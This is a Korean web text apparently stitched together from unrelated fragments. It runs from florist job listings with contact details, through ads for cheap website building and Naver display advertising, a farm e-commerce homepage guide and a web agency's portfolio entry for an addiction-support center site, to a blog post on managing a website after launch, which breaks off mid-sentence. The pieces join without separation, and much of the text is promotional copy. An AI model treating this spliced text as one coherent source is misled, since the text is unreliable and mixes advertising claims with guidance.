꽃다발,꽃바구니,식물심기,판매 등등...급여 : 면접후 4대보험유무 : 없음지원자격 : 로드샵 경력자29살이하의 여성 플로리스트근무시간 : 면접후 휴일 : 월 6일 휴무(주말 근무자)지원방법 : 이메일(한글)로 이력서 포토플리오 보내주시면 전화연락드리겠습니다.연락처 : 02-337-7796이메일 : 80ijy@hanmail.net게시일 2016.09.22상호 :그린플라워주소 : 고양시 화정동 (화정역 도보3분거리)홈페이지 :고용형태 : 아르바이트주업무 : 꽃바구니 제작및 판매급여 : 시급4대보험유무 :지원자격 : 꽃집 근무경력자근무시간 : 18:00~22:00휴일 :지원방법 : 서면제출연락처 : 010-2370-4804게시일 2016.09.22상호 :테소로플라워주소 : 서울시 관악구 신림로 330홈페이지 :고용형태 : 직원주업무 : 플라워샵업무전반급여 : 최저임금이상4대보험유무 : 가능지원자격 : 경력1년이상근무시간 : 일 9시간 (근무시간협의)휴일 : 월 6회지원방법 : 이메일연락처 : 536-7586이메일 : tesoroflower2@hanmail.net게시일 2016.09.25상호 :(주)플라워119꽃배달서비스주소 ; 서초구 서초동 1640-6 은석빌딩 2층홈페이지 :www.flower119.co.kr 고용형태 : 정직원주업무 : 홈페이지관리, 고객응대. 수발주업무급여 :협의4대보험유무 : 유지원자격 : 성실하신 모든분근무시간 : 오전10시~ 오후7시휴일 :주5일근무지원방법 : 전화 또는 이메일연락처 : 02-3471-6778, 010-4117-7702이메일 :dd7702@hanmail.net게시일 2016.09.26안녕하세요, 저렴함 홈페이제제작전문 별찌입니다.간단한 업체 소개 및 문의를 받는 홈페이지를 저렴하게 제작해보세요.유지/보수 비용도 없어 홈페이지 관리에도 돈이 안 드는 저렴한 홈페이지제작!   기본 소개만 들어가는 홈페이지, 저렴한 가격 대비 효율성이 뛰어난 원페이지, 랜딩페이지 제작 등제작 실력이 뛰어나고 믿을 수 있는 홈페이지 제작업체를 선택하세요. ​   홈페이지 제작가격의 거품을 없앤 별찌 반응형 홈페이지제작!필요한 기능만! 필요한 카테고리 개수만큼! 견적을 내주는 투명하고 신뢰할 수 있는 견적 시스템입니다.   추가 비용 없이 PC와 100% 호환되는 모바일 홈페이지까지 제작!홈페이지 제작 문의 시 1:1 전담 제작 담당자님과 친절 상담은 물론 상세한 견적 안내를 도와드립니다.​   저렴한 홈페이지제작을 알아보실 때 꼭 따져보셔야 되는 점!제작비 외의 추가 비용을 받는지,  매달 유지/보수 비용이 있는지 알아보셔야 합니다.   저렴한 홈페이지 제작-별찌   저렴하게 제작했으면 사용하면서도 돈이 안 드는 홈페이지 제작하셔야 하죠.별찌는 제작비 외 추가비용X, 유지/보수 비용도 X​   홈페이지 전반을 간단하고 쉽게 관리할 수 있는 관리자 페이지를 제공텍스트 및 이미지를 언제든지 직접 수정할 수 있습니다. ​   저렴한 홈페이지 제작에 뛰어난 기능을 제공!​추가 비용 없이 모바일 홈페이지 제작팝업/배너 기능 무료 제공무제한 웹 호스팅, 무제한 용량 제공.. 별찌 반응형홈페이지제작반응형쇼핑몰제작,어플제작,쇼핑몰제작업체,무료모바일,홈페이지제작비용,반응형홈페이지byulzzi.com 저렴한 홈페이지 제작 상담은 ☎1800-2142 또는 홈페이지로 문의주세요.감사합니다 :) ​​​최근 #네이버성과형DA 관련된 포스팅을 자주 작성하고 있는데 그만큼 광고주님들의​관심이 가장 높고, #네이버성과형DA광고 문의가 굉장히 많이 들어오고 있습니다.​​그래서 오늘도 #성과형DA 내용으로 포스팅을 작성해보려고 합니다. 앞선 포스팅에서​#성과형DA광고 는 시간을 투자하는 만큼 매출이 발생한다고 말씀드렸는데,​혹시 조금 더 많은 시간을 집중해서 관리하고 계십니까? 지금 세팅된 계정과 한 번​꼼꼼하게 비교해보시길 바라겠습니다. 그럼 지금부터 시작하겠습니다!​​​ ​​​광고 세팅할 때 감으로 또는 대충 예상만으로 성별 & 연령대 타깃을 나눠서 세팅하는​마케터들이 많이 있습니다. 하지만, 광고는 실제 돈이 투자되고 투자한 만큼 효율이 나와야​하는 구조로 절대 감으로 광고를 세팅하면 안 됩니다. 정확한 데이터 바탕으로 세팅해야​이에 맞는 정확한 광고 효율 또한 체크할 수가 있습니다. #네이버성과형DA 세팅 시 ​아주 기본적인 데이터를 확인하는데 딱 3분이 소요되지만 이것조차 확인하지 않고 앞서​말씀드린 것처럼 대충 감으로 성별 & 연령대를 나눠서 세팅하는 경우가 굉장히 많습니다.​​​ ​​​#네이버키워드도구 및 #네이버데이터랩 시스템은 모두 알고 계시죠? 광고 세팅 전​이 2개의 시스템을 활용하는 것입니다. 홈페이지에서 단일 1개 상품만 판매하는 업체보다​여러 가지 상품을 다양하게 판매하는 업체들이 많은데요, 많은 상품 중 어떤 제품을 먼저​광고를 진행해볼까? 고민될 때 #네이버데이터랩 을 통해 제품 관련 키워드 조회 수가​증가하는 시즌에 맞춰 진행하시면 됩니다. 또한, #성과형DA광고 를 이미 실컷 운영하고​보고서를 확인한 후 성별 & 연령대를 다시 세팅하는 업체들이 많이 있습니다.​​​ ​​​#네이버키워드도구 를 활용한다면 굳이 시간을 낭비하고 타깃을 수정하는 일이 업습니다.​#네이버키워드도구 에서 자상호 & 대표 키워드 & 경쟁 키워드 몇 개만 검색해봐도 제품의​제품 타깃층을 정확하게 알 수 있습니다. 하지만, 이것조차 몰라서 또는 귀찮아서 찾아보지 않고​그냥 대충 세팅하는 계정들이 굉장히 많다는 것이 함정입니다. 광고 세팅 전 꼭 필수입니다!!​​​ ​​​​또한,  광고 세팅뿐만 아니라, 매출이 나오지 않을 경우 기본적인 홈페이지​수정안도 함께 전달드리고 있습니다. 광고주님의 1만 원도 소중하게 생각하고 있습니다.​그렇기에 광고 세팅 전 최대한 비효율적인 운영을 진행하지 않고 있습니다.​​​ ​​​이 외 소재별 전략 & 예산 전략 등 아주 다양한 방법들이 많이 있습니다. 하지만​포스팅에 노하우 내용을 모두 담을 수 없음을 양해 부탁드리며, 추가 궁금하신 사항은​언제든지 유선 문의 부탁드립니다. #네이버성과형DA광고 진행 시 소재 제작까지 모두​가능하며, 지금 운영하고 있는 광고 계정과 그리고 대행사와 충분히 비교해보십시오!​​​ ​​​하루에 일 예산 20만 원 사용했던 A 업체 경우 #성과형DA 광고에서 효율이 나오기​시작하면서 4일 만에 예산을 300만 원까지 증액한 사례가 있습니다. DA 광고 이렇게​처음 세팅만 잘 하면 바로 매출 발생할 수 있습니다. 이제 #네이버성과형DA 광고 더 이상​어렵지 않습니다. 관리하는 사람에 따라서 효율 얼마든지 나올 수 있습니다!​​​​24시간 문자 & 메일 & 전화 문의 가능합니다.010-8675-7630 1. 홈페이지 관리⦁ 농산물 전자상거래 홈페이지는 잘 만드는 것도 중요하지만 얼마나 관리를 잘 하느냐가 더 중요하고 홈페이지 관리 시간을 영농의 한 부분으로 생각하고 홈페이지를 관리해야 한다.⦁ 홈페이지 관리를 생활화하고 소비자의 눈높이에 맞춰 고객 중심으로 운영한다. 이상적인 것은 고객과 관리자가 홈페이지를 함께 운영하는 것이다.⦁ 관리자인 농업인은 기술적으로는 부족하더라도 열정과 애정을 가지고 고객과 소통하기 위해 노력하고 인터넷 활용능력을 높여야 한다. 정보통신기술(ICT)을 습득하는 것은 물론, 농가만의 콘텐츠를 지속적으로 개발하는 등 홈페이지 관리능력을 키워 나가야 발전할 수 있다.⦁ 온·오프라인 시장의 흐름을 분석하여 고객의 움직임을 홈페이지에 반영하고 농산물을 판매하는 다른 홈페이지를 벤치마킹한다. 좋은 운영 사례는 홈페이지 관리에 활용한다.⦁ 고객들로 하여금 홈페이지에 관심을 가지고 참여할 수 있도록 이벤트나 포인트 제도를 도입해서 보상해준다. 또, 고객들이 올린 글, 사진, 동영상 등에 관심을 가지고 피드백해줘야 한다. ⦁ SNS를 통해 고객이 쉽게 농장 홈페이지에 접근할 수 있도록 관리자는 SNS 활동에 적극 참여한다. 많은 사람이 우리농장 홈페이지에 접근할 수 있는 다양한 형태의 징검다리를 만들어준다.※ SNS(Social Networking Service)의 종류 : 블로그, 유튜브, 페이스북, 트위터, 카카오스토리, 싸이월드, 미투데이, 네이버밴드, 인스타그램, 핀터레스트, 바인, 아프리카 TV 가. 누가 어떤 내용으로 홈페이지 관리해야 하나?⦁ 생산자가 관리해야 하며, 단순히 컴퓨터나 스마트폰을 잘 다루고, SNS 활동을 많이 한다고 해서 영농에 종사하지 않는 자녀들이나 고용된 사람에게 관리를 맡겨서는 안 된다.⦁ 그 이유는?- 영농현장에서 일어나는 일들을 사실 그대로 홈페이지에 옮겨 야 하기 때문에 관리자는 상품인 농산물의 생산에서부터 소비자의 식탁에 오르기까지의 전 과정을 알고 있어야 한다.- 농산물이 생산되는 일련의 과정들을 홈페이지에 자세하게 올려야 하는데 고용된 사람은 정확한 내용을 모르기 때문에 형식적인 내용을 올릴 수 밖에 없다.- 영농(상품생산)에 참여하지 않는 자녀들은 농장 상황을 잘 알지 못하기 때문에 소비자가 알고 싶어 하는 내용을 홈페이지에 올리지 못한다. ⦁ 또한 영농에 종사하지 않는 자녀는 일정한 시기가 되면 학업이나 결혼 등의 여러 이유로 부모 곁을 떠나게 된다. 그렇게 되면 홈페이지 관리가 소홀해질 수 있다.  나. 홈페이지 관리 잘하는 방법은?⦁ 홈페이지를 관리하는 도구(방법)는 글, 사진, 동영상, 음향이나 음악 등을 활용하면 되고 동영상은 5~10초 정도로 짧게 촬영하되 편집 없이 사실 그대로를 올린다.  중 요  사진, 동영상, 글씨체, 노래 등 저작권이 있는 자료는 소유자 허락 없이 무단으로 복사 또는 다운로드해서 사용하면 안 된다.  ⦁ 스마트폰, 디지털카메라 필기도구 등은 항상 가지고 다닌다.⦁ 작성자명은 농장주의 애칭이나 농장주 이름을 사용한다.⦁ 사진을 홈페이지에 올릴 때는 사진설명을 함께 올린다.⦁ 홈페이지에 매일매일 한 줄이라도 업데이트를 해서 홈페이지가 활발하게 운영되고 있다는 것을 보여주어야 한다.⦁ 홈페이지에 고객상담이 들어왔을 때는 24시간 이내에 답변 한다.⦁ 고객의 질문에 답할 때는 정성을 다해 꾸밈없이 솔직하게 답변한다.⦁ 답글을 쓸 때는 고객의 이름을 먼저 쓰고, 내용을 쓸 때도 과장된 미사여구보다는 솔직담백한 글을 쓴다. 마무리할 때 한두 줄 정도로 농장 이야기나 상품 이야기를 언급해, 고객이 자연스럽게 농장이나 생산품에 호감을 갖게 한다.⦁ 홈페이지에 올려야 할 내용- 농장주가 쓰는 영농일기- 농장 주변의 동식물이 살아가는 모습- 농장주가 살고 있는 마을 이야기- 농장 주변의 이야기- 농장주가 살아가는 모습- 농장주가 생각하는 고객들의 살아가는 모습- 농작물(상품)의 재배과정- 농작물을 재배하기 위하여 사용되는 농자재- 농장에서 직접 만들어 사용하는 농자재- 농가가 사용하는 농법- 농장에 사용하는 친환경농법- 상품포장 및 배송과정- 농장 주변의 사계절 이야기- 앞으로 판매될 상품 이야기- 농산물을 이용한 요리법- 미래 우리농장의 모습- 농장에서 생산된 상품을 먹는 농장 사람들 이야기- 농장주의 철학이나 생각⦁ 고객이 올린 글, 사진, 동영상, 음악 등은 홈페이지의 신뢰성을 주는 것은 물론, 신규 고객에게 좋은 홍보가 된다. 긍정적인 내용은 그 자체가 매출증대로 이어지며 클레임이나 부정적인 내용도 숨기지 말고 고객의 입장에서 투명하게 대처해야 한다.⦁ 소비자 체험행사, 이벤트 등의 다양한 방법으로 고객이 홈페이지 운영에 참여할 수 있도록 정기적으로 우수고객에게 보상하고 그 내용을 홈페이지에 공지해 참여를 유도한다.⦁ 농업 관련 자료는 판매상품과 관련 없는 것이라도 올리는 것이 좋다.⦁ 홈페이지를 체계적이고 효율적으로 관리하기 위해서는 향후 수년간의 계획을 짜서 계획적으로 홈페이지를 관리하고 연말에는 평가를 한다.⦁ 농장에서 사용하는 농자재나 농업기술 중 친환경 농자재나 친환경 농업기술을 부각시켜 고객의 관심을 끈다.⦁ 상품에 대한 불만사항이 홈페이지에 올라오거나 클레임이 발생했을 경우 신선 농산물(생과)은 반품받지 말고 새로운 상품으로 바꾸어주는 등 소비자의 요구에 적극적으로 대응하고 신속하게 문제를 해결하여 위기를 기회로 만든다. 다. 고객을 위한 다양한 이벤트가 있어야 한다. ⦁ 이벤트의 종류는 농장사진 콘테스트, 포도송이 분양 고객대상 행운잔치, 소비자 수확체험 경품추첨, 첫 수확 농산물 보내기, 맛보기 무료상품 보내기, 상품 후기, 감사세일, 덤 상품주기, 농장 지킴이 선발, 농장방문 후기 라. 농장체험으로 고객이 농장에 관심을 갖도록 한다.⦁ 고객에게 믿음과 신뢰를 주기 위해 농장을 완전히 개방한다.⦁ 체험고객의 먹거리는 농가에서 생산한 먹거리로 한다.⦁ 체험을 다녀간 고객이 홈페이지에 글을 올리면 보상을 해주어 고객들이 다양한 글을 올릴 수 있도록 한다. ⦁ 덜 알려진 곳, 특별한 것을 체험소재로 하는 것이 좋다.⦁ 덤은 적당히, 너무 많지 않게 한다.    ​메이크홈즈 홈페이지제작및관리 관련 지식 낱낱이 파헤치기!빠트리고 가면 100% 후회하는 모바일 홈페이지 제작 핵심 정보 공개  안녕하세요 이웃님들~저는 오늘 기분좋게 하루를 시작했는데 여러분도 신나는 하루 되고 있나요?기분 좋은 하루가 되길 바라며!오늘은 홈페이지제작및관리 에 관해 올려볼게요~  모바일에 최적화된 모바일 홈페이지는,별도의 모바일 버전 사이트를 운영하거나PC버전의 홈페이지가 스마트폰에서 호환되는 두 가지 방식이 있습니다.​  모바일 사이트 제작 시에는 초기 계약 비용도 잘 확인하셔야 합니다.무턱대고 저렴한 곳만 찾아서 할 경우에는 이후 추가 비용이 2배로 발생되거나느린 피드백으로 마음고생이 심할 수 있습니다.​요즘 스마트폰을 사용하는 고객이 많은 만큼,만들어진 홈페이지가 PC뿐 아니라 모바일 상에서도 호환시키는 것이 바람직합니다.​최근 대행업체를 거쳐서 견적을 계속적으로 청구하지 않고도무료로 직접 뜻하는 모바일 웹페이지를 구축할 수 있는 시스템이 개발되어많은 소상공인 환영을 받고 있습니다.  우리나라 스마트폰 전체 이용자 수가 총 4000만 명을 돌파하면서예약, 주문, 결제 절차가 완벽하게 갖추어진 핸드폰 전용 사이트또는 어플리케이션 제작의 필요성이 매우 높아졌습니다.​  ​  꼭 기억해야하는 핵심만 모았다! 쇼핑몰 홈페이지 제작 연관 상식  상품을 판매하는 쇼핑몰이 홈페이지를 제작할 때,직관적인 상품 리스트를 구성하여 보편적이면서합리적인 홈페이지로 제작하는 것이 바람직합니다.​홈페이지 상에 견적문의 게시판을 생성해 고객의 문의나 건의를유동적으로 받을 수 있도록 해야 제대로 된 홈페이지 관리가 된다고 할 수 있는 것입니다.​기획형 쇼핑몰 온라인 사이트를 제작할 때,브랜드만의 감각있는 디자인 구조와 프로그램으로특색 있는 쇼핑몰을 개설하는 것이 좋습니다.​상품의 종류가 많지 않을 경우 임대 쇼핑몰의 임대료도 지원받을 수 있으니쇼핑몰을 구상하고 있다면 여러가지 혜택을 알아보는 것이 좋습니다.​  ​일반 카탈로그 페이지와 비교해 쇼핑몰 홈페이지에서는구매자와 판매자 사이에서 금전 거래가 발생하기 때문에세무당국에 신고하여 사업체 자체로의 인정을 받고 홈페이지에 필수 표기해야 합니다.​  ​우리 가게를 더 쉽게, 더 대대적으로 홍보하는 방법! 제2의 집인 홈페이지를 제작하세요!비교 불가능한 품질을 갖춘 로고와 홈페이지를 제작해주는 메이크홈즈가 도와 드릴게요!  업체의 상품과 서비스를 세세하게 분석해 더 보기 쉽게, 더 흥미가 일도록 제작해주는 곳!인스타그램 등 SNS를 이용해 다양한 광고마케팅도 시행해 홍보효과를 2배로 높여주는 곳!​퀄리티 대비 정직하고 낮은 견적으로 고객님의 마케팅 비용은 낮추고!신속정확한 일처리 및 지속적인 피드백으로 홈페이지 제작 및 서비스 만족도는 높여주고!​지금 즉시 메이크홈즈에 문의하시어 우리 업체를 더 많은 사람들이 볼 수 있게 해 보세요!홈페이지 문의 전화 052-267-2027/ 010-3063-7993특정 분야에서 큰 업적을 세운 이들의 공통점은 지능보다는 중도포기하지 않는 끈기와 흥미라고 합니다.물론 잇님들 모두가 홈페이지제작및관리 관련 분야에서만 활동하진 않으시겠지만!하지만 알아두면 언제 어느 때든 반드시 도움이 될 테니 다시 한 번 복습해주시기 바라요!​  노원구중독관리통합지원센터2019/01홈페이지 주소 : www.nowon-addiction.or.kr 노원구중독관리통합지원센터중 독 으로부터 안 전 한 지역사회를 만들어 가는 노원구중독관리통합지원센터입니다. 지역주민들에게 회복의 희망을 전달하고 건강한 지역사회를 만들어 나가기 위하여 최선을 다하겠습니다. 더 이상 의 지 력 의 문 제 가 아닙니다. 치료가 필요한 뇌질환입니다. Stop for your brain! Start for your life! 1 2 3 상담전화 02.6941.3677~8 평일 09:00~18:00 야간/주말 및 공휴일 1577-0199 온라인 상담신청하기 자가진단 중독 상태를 자가진단으로 체크해보세요. 공지사항 노원구중독관리통합지...www.nowon-addiction.or.kr ​​​​ ​​​​＂중독으로부터 안전한 지역사회를 만듭니다."​​ 노원구통합중독관리통합지원센터 반응형 홈페이지 제작 프로젝트는 알코올, 인터넷, 도박, 약물 등 중독문제에 대한 예방, 상담 및 치료연계 및 재활을 통해중독으로 인한 폐해를 예방하고 본인 및 가족의 회복을 지원함으로써 안전한 사회환경 조성 및지역주민의 건강증진을 도모하고자 하는 아이덴티티를 보여주려고 노력했습니다.   모든 디바이스 환경에서 최적화된 화면과 여러 가지 중독으로부터 자가진단을 할 수 있는 홈페이지입니다.​​​​ ​​​​​포근함과 따듯함을 주는 비주얼​​ 메인페이지에서 따듯하고 행복한 가정을 나타내기 위한 일러스트와 이미지를 사용하였습니다.또한 동적효과를 주어 메인 비주얼 영역에서 시선을 잡을 수 있도록 설계하였습니다. 하단의 콘텐츠들은 홈페이지 전반에서 가장 중요한 부분들을 노출시켜 메인 페이지에서 모든 목적에 도달하기 쉬운 UI/UX를 사용하였습니다.​​​​​  ​ 홈페이지 셀프 관리방법 #1 - 오류검수부터 사이트등록까지!      네이버 오픈캐스트 발행시작했습니다.   <클릭하시면 오픈캐스트를 확인하실 수 있으며, 구독하실 수 있습니다>  오늘은 홈페이지 제작후에 스스로 관리하는 방법에 대해서 알아보겠습니다. 홈페이지제작전문업체에 의뢰한 후에 제작 후 놓치기 쉬운 부분에 대해서 이야기해볼텐데요. 회사내에 홈페이지를 전담해서 관리하는 팀이나 직원이 있거나, 이것저것 신경쓰기 어려워서 제작업체에 유지보수비용을 지불하고 지속적인 관리를 맡기는 경우도 있지만, 이번 포스팅은 소규모 회사에서 직접 관리를 할때 알아두셨으면 하는 내용입니다. 간혹 어처구니 없는 홈페이지유지보수 업체의 횡포로 인해 피해를 보는 경우가 있는데요. 지인들 중에서도 피해를 본경우가 있어서...도움을 준적이 여러번 있었습니다. 많은 사람들이 홈페이지를 제작한 후에 간과하는 경우가 많은데, 알아두시면 이러한 피해를 줄일 수 있을 것 같습니다. 01. 홈페이지 기능 오류검수 포인트02. 도메인/호스팅 관리자정보 수령 및 변경03. 포털사이트 '사이트등록' 방법04. 웹문서 노출 등록 (네이버/구글) 포스팅 하나로 정리하기에는 상당한 양의 내용이 될 수 있기 때문에 핵심 내용들을 위주로 포스팅하겠습니다. 보다 상세한 설명이 필요하신 분들은 댓글이나 쪽지로 문의해주세요. 그럼, 홈페이지 기능 오류 검수 포인트에 대해서 알아보겠습니다. ---------------------------------------------------------------------------------------------------- 홈페이지제작이 완료되면, 제작업체 자체적으로 오류검수 및 기능 테스트 등을 진행하게 됩니다. 경험과 실력이 있는 곳이라면 사용자의 여러가지 패턴등을 고려해서 테스트를 진행하게 될텐데요. 예를 들어 회원가입 시 비밀번호 입력란에 입력한 값과 비밀번호 확인 입력란에 입력한 값이 다르게 했을때, 회원가입이 이상없이 진행된다면 문제가 있는 것이죠. 또, 온라인상담등의 게시글 제목을 많이 길게 쓰고 등록을 하였을 때 게시판이 원래의 사이즈보다 억지로 늘어나버린다거나 하는 것 또한 오류라고 할 수 있겠습니다.이외에도 본인의글을 등록하고 비밀번호를 입력했는데도 볼수 없다거나, 수정을 눌렀을때 반응이 없거나 수정이 정상적으로 되지 않는 것 또한 오류가 되겠습니다.이처럼 홈페이지 오류 검수내역은 상당히 많이 있습니다. 일단 홈페이지제작업업체에서 어느정도 검수를 끝냈다는 가정하에 제작을 의뢰한 분들도 시간을 가지고 꼼꼼히 보는 것이 좋습니다. 시간이 상당히 지난 후에 수정요청를 제작업체에 하게되었을때 대부분은 오류라는 것을 인정하고 수정을 해주지만, 간혹 추가비용을 요구한다거나 수정이 상당히 뒤로 밀려버려서 오래걸리는 경우가 더러 있기 때문입니다.  <홈페이지 셀프관리방법의 첫번째 '오류검수' 포인트>  01. 제작 초기에 의도한 디자인과 기능이 모두 반영이 되었는지, 생략되거나 바뀐 부분은 없는지 확인할 것02. 회원가입 부터 글등록, 삭제, 수정, 댓글, 회원탈퇴를 최소 3~4번 정도 해볼 것03. 다양한 환경에서 홈페이지에 접속해 볼 것     ex) 데스크탑, 노트북, 타블릿pc 등 . 윈도우 및 익스플로러 버젼위의 3가지 모두 중요하지만, 1,2번은 대부분 제작업체에서 테스트를 해보는경우가 많고 이미 수십, 수백개의 홈페이지를 만든곳이라면 정형화된 프로그램이 있기 때문에 저런 부분에서 오류가 생기는 경우는 드믈다고 할 수 있습니다. 홈페이지를 제작한다고 해서 프로그램을 매번 100% 새로 만드는건 아니니까요.놓치기 쉬운 부분이 3번인데요. 데스크탑, 노트북, 타블릿pc에서는 조금씩 다르게 나올 수 있습니다. 반응형웹이 아닌이상 100%만족스럽게 나오기는 어렵죠. 하지만, 윈도우의 버전 및 특히 익스플로러의 버젼에 따라서 홈페이지 제작에 사용한 기능이 작동되지 않거나 오류가 나는경우가 많이 있습니다. 아직도 많은 사용자들이 익스플로러8을 사용하는데, 익스플로러11에서 정상적으로 동작하는 기능이 익스8에서는 호환이 되지 않는 경우가 많습니다. 이런 부분 또한 확인을 하시는 것이 좋습니다.'홈페이지 방문자는 제법 되는데..왜? 문의가 없을까?'이것을 진단할때 가장 먼저 봐야하는 것이 홈페이지 오류검수 입니다.이부분은 다음에 웹마케팅에 대해서 이야기할때 다룰께요^-^홈페이지제작 후 오류검수를 모두 마친 후 잔금을 지급하는 것도 방법입니다. 물론 계약서 상에 명시가 되어있어야겠지요.하지만, 오류검수를 핑계로 잔금지급을 의도적으로 미루는 것은 깔끔한방법은 아니겠죠^-^제작의뢰업체는 빠르게 검수를 봐주고, 제작업체는 신속하게 수정해주고!​----------------------------------------------------------------------------------------------------  홈페이지관리방법 두번째는 도메인/호스팅 관리자 정보 수령 및 변경인데요. 대부분의 홈페이지 제작업체에서는 도메인과 호스팅을 업체에서 직접 구매를 해서 제작을 진행하는 경우가 있습니다. 제작이 완료된 후에도 도메인이나 호스팅 소유자가 제작업체로 되어있는 경우가 많고요. 이 때 발생하는 문제점은 홈페이지 제작업체가 증발(?)을 해버리는 경우에는 도메인과 호스팅 관리자 정보를 찾는게 매우 어렵습니다. 물론 찾는 방법은 있지만, 찾더라도 증빙서류를 보내는등 다소 불편한 과정들이 기다리고 있습니다.그래서 가장 좋은 방법은 홈페이지 제작을 의뢰하기 전에 도메인과 호스팅을 직접 구매한 다음에 업체에 제작을 의뢰하면서 관리자정보를 알려주면됩니다. 제작이 모두 끝난 후에는 관리자 비밀번호를 변경해주고요.도메인과 호스팅 임대에 대표적인 사이트는 까페24와 가비아가 아닌가 싶습니다.물론 많은 업체들이 있지만, 개인적으로 10여년 전부터 두 업체 모두 이용을 해봤고 처리나 안전성 부분에서 괜찮은 것 같습니다. 물론 갑작스런 디도스 공격을 받고 서버가 다운된다거나 하는 불가항력적인 이벤트가 발생하기도 했었지만, 고객응대는 상당히 빠른것 같아서 만족스럽습니다.도메인/호스팅 임대는 말그대로 영구적으로 내가 구매를 하는 것이 아닌 일정기간동안만 임대를 하는 것입니다.특히 도메인을 임대해주는 업체는 정말 많습니다. 도메인을 검색해보면 가입자 정보와 업체도 확인할 수 있고요.도메인/호스팅을 직접 구매하는 것을 추천하는 이유는 앞서 이야기한데로 제작업체의 증발 부분도 있지만, 도메인과 호스팅은 기간 임대이기 때문에 만료인이 되기 전에 연장을 해주어야 합니다. 호스팅이야 기간이 만료되었다고 바로 삭제가 되거나 하지는 않지만, 도메인은 다른 업체에서 만료된 도메인을 임대해 갈 수있기 때문에 조심하셔야 합니다.     도메인을 임대하셨다면, 해당 사이트에 로그인하였을때(예를 까페24로 들었습니다.) 나의서비스관리라는 메뉴가 보입니다.이것을 클릭하면, 왼쪽 위에 호스팅연장, 도메인연장이 보이는데요. 도메인연장을 클릭하면 해당 도메인의 만료일이 나옵니다. 해당 도메인의 관리자로 등록이 되어있다면, 만료되기 한달~1주일 전부터 문자메세지, 이메일이 날라오니 확인 후 연장해주시면됩니다. 도메인은 한번 다른 업체에 뺏기면 다시 가져오기 어렵습니다. 상대방이 만료된 상태에서 연장을 하지 않아야 하거든요. 예전에 입사했던 성형외과에서는 도메인을 다른 업체에 뺏겼는데...도메인을 장사(?)를 하시는 분이더라군요. 1년에 약 2만원가량 하는 도메인을 넘겨줄테니 500만원내놔라. 라는...어처구니없는...악질이더라고요.결국 도메인을 포기할 수 밖에 없었습니다.의도적으로 트래픽이 많이 발생하는 사이트의 도메인인지를 확인한 다음에 실수로 연장을 하지 않으면 구매를 해놨다가 이런식으로 고가에 되파는 경우가 허다합니다. 몇년간 홍보가 되어있던..인쇄물에도 찍혀있던 도메인을 버린다는 것은 굉장한 손실이 될 수 있기 때문에 홈페이지 셀프관리방법중의 중요한 내용으로 소개드렸습니다.물론 도메인과 호스팅을 직접 구매하지 않고 업체에서 구매해서 홈페이지 제작이 모두완료된 후에 넘겨주는 경우도 있습니다. 업체에서는 도중에 잔금을 받지 못할 수도 있기 때문에 계약서에 이와같이 하는 명시할 수도 있는데요. 홈페이지 제작 진행중에 제작의회한 업체가 사라진다거나 잠수를 탄다거나 하는경우가 발생할 때 법적 조취를 취하기도 애매하고 복잡한 경우가 발생하기도 합니다. 또한 에이전시 중에는 자체적으로 서버를 보유하고 있는 곳들도 있기 때문에 자사의 서버를 이용해야하기 때문에 호스팅 권한을 넘겨주지 않는 경우도 있습니다.또한가지 이유는 프로그램 보안때문에 호스팅 정보를 넘겨주길 꺼리는 곳들도 있습니다. 앞서 이야기할데로 홈페이지 웹프로그램은 소스가 자산이기 때문에 여기저기 노출이 되어버리면 이 또한 회사로서는 손실이기 때문입니다. 초기에 확실하게 계약서에 명시를 하고 서로 합의하에 결정하는 것이 좋겠습니다.   홈페이지관리방법 세번째는 포털사이트(네이버/다음 등)에 사이트등록을 하는 것입니다. 홈페이지 제작업체에서 서비스로 해주는 경우도 있지만, 비용을 요구하는 경우도 있습니다. 이런 것들은 인터넷에 포스팅도 많이 있기 때문에 직접 보면서 차근차근 따라해 보시면됩니다. 포스팅을 참고하지 않더라도 쉽게 할 수 있습니다.<네이버 검색등록 사이트 https://submit.naver.com/>  관리하고자 하는 네이버아이디로 로그인한다음에 사이트 부분에 URL을 입력하고, 전화번호를 입력하면 검색등록신청이 됩니다.병의원이 아닌이상 특별히 서류를 요청하거나 하지는 않았던거 같은데...신청하면 영업일 기준 15일 이내에 결과가 나옵니다. 설명문구가 허위과대광고라거나, 선정성, 불법 등에 관련된것만 아니라면 신청한 그대로 등록이되는 편이며, 홈페이지의 정보와 신청한 내용의 정보가 일치하지 않을시 보류처리가 될 수 있습니다. 대부분은 정상적으로 등록이 잘 됩니다.다음도 네이버와 유사합니다. 다음은 오히려 신청 후 일주일 내외로 빠르게 등록이 처리됩니다. <다음 검색등록 https://register.search.daum.net/index.daum >    ----------------------------------------------------------------------------------------------------  홈페이지관리법 마지막으로 웹문서 노출 등록을 알아보겠습니다. 웹문서 노출이라는 것은 포털사이트(네이버/다음)에서 특정 키워드를 검색했을 때, 웹문서 영역에 나오는 것을 말하는데요. 웹문서 마케팅이라는 말도 있을 정도로 디테일한 마케팅에 필요한 채널이라 할 수 있겠습니다. 실제로 모든 광고가 끊겼을 때도 웹문서를 통해서 홈페이지 일일방문자가 100여명이 들어오고 전환율이 20%가까이 나온경험도 있습니다.홈페이지 일일방문자 100여명은 마케팅 툴을 이용한 것에 비해서는 상당히 낮은 숫자이긴 하지만, 돈을 들이지 않고 홈페이지에 매일같이 100여명이 들어온다면 이 또한 고효율 마케팅이 아닌가 싶습니다.하지만, 웹문서 영역에 나의 홈페이지를 노출시키는 것은 상당한 내공이 필요합니다. 지금 소개드리는 내용은 웹문서 노출을 위한 기본작업이라 생각하시면 되겠습니다.<네이버에서 강남성형외과 검색 시 웹문서 노출>   이러한 형태로 노출이 됩니다.     최근에 네이버에서 서비스를 시작한 네이버웹마스터도구 입니다. 이전까지는 네이버신디케이션이라는 것을 홈페이지에 설치하거나 했었지만, 네이버에서 베타버전으로 서비스를 시작했습니다. 이또한 어렵지 않게 신청할 수 있습니다.http://webmastertool.naver.com/ 마찬가지로 네이버아이디로 로그인한 후에 사이트정보를 입력하고, 등록신청을 하면됩니다. 보통 다음날부터 수집이 이루어지는 것으로 보입니다. 이외에도 구글웹마스터 도구를 이용해서 사이트를 등록하면 구글사이트에 노출이 잘되는 편입니다.  홈페이지는 어떻게 만드느냐도 중요하지만, 만들고 난 후에 어떻게 관리를 해주느냐도 중요합니다. 사용자가 홈페이지를 이용할 때 불편하거나 오류가 있으면 않되고, 기업의 장점을 사용자가 홈페이지에 머무는 짧은 시간동안에 최대한으로 어필할 수 있어야 하며, 웹 신뢰를 줄 수 있어야 합니다. 웹 신뢰는 오류없이 정상작동, 빠르고 정확한 응대(게시판 답변 등), 새로운 신규 콘텐츠(몇년된 콘텐츠는 신뢰도 